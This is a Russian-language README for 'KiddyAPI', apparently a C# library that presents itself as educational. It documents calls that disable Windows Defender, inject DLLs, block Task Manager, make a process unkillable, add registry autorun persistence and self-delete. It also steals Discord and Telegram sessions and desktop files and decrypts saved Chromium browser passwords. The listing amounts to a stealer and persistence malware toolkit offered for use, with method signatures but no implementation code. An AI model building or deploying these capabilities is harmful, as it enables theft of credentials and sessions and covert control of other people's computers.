# KiddyAPI
KiddyAPI создана от "скрипт-кидди" для "скрипт-кидди". Библиотека, для изучения не очень правильных методов работы с Windows OS.
## Отказ от ответственности
Данная библиотека была написана в образовательных целях, автор не несет ответственности за использование в других целях.

Использовать только на своих компьютерах или с разрешения пользователя
## Нэймспэйсы и методы :
### Info:
Получаем активное окно пользователя по заголовку - `CheckWindow.GetWindow("example");`

Задаем новый пароль на Windows - `SystemWork.ChangeWinPass("example");`

Получаем внешний IP адрес - `SystemWork.GetIP();`

Получаем информацию о необходимых модулях - `SystemWork.GetInfo(WinClass,ClassItem);`

Получаем MAC-адресс - `SystemWork.GetMacAddress();`

Получаем скриншот экрана - `SystemWork.GetScreen("C:\\example")`;

### Injector:
Инжектим в процесс C++ DLL - `Injector.Execute(pathToDLL, Process);`

### Config:
Класс для дальнейших наработок, пока особо ничего в него не писал

Проверяем, под админом ли запущенны - `if(Config.IsAdmin) { blablabla } `

### Protect:
Отключаем Windows Defender - `DisableDefender.FirstRun();` - Используется при первом запуске программы,
затем используем `DisableDefender.CheckDefender();` в бесконечном цикле, для того что бы проверять, не изменились ли параметры

Закрываем программу, если запущен какой то процесс - `HideModule.CheckProcess("example");`

Блокируем/Разблокируем Диспетчер задач - `HideModule.EnableTaskManager(true/false);`

Самоудаляемся - HideModule.Suicide(pathToOwnExe);`

Добавляем в автозагрузку( через реестр ) - `HideModule.SetAutorun(имя, которое будет отображаться в реестре, pathToFile);`

Делаем процесс невозможным убить в Диспетчере задач - `ProcessProtect.Protect();`

### Steal :

Тут мы копируем файлы с рабочего стола/сессию Дискорда/сессию Телеграмма

Общий вид такой :

 `Apps.Desktop/Telegram/Discord/.Steal(pathToCopy, true/false(перезапись старых файлов, если уже есть);`

Расшифровываем пароли с ChromiumBased браузеров - `Browsers.DecryptBrowsers(пароль из бд,энтропия);` 

Граббер добавлять не стал, так как это уже жирно. Декрипт происходит через WinAPI функцию.


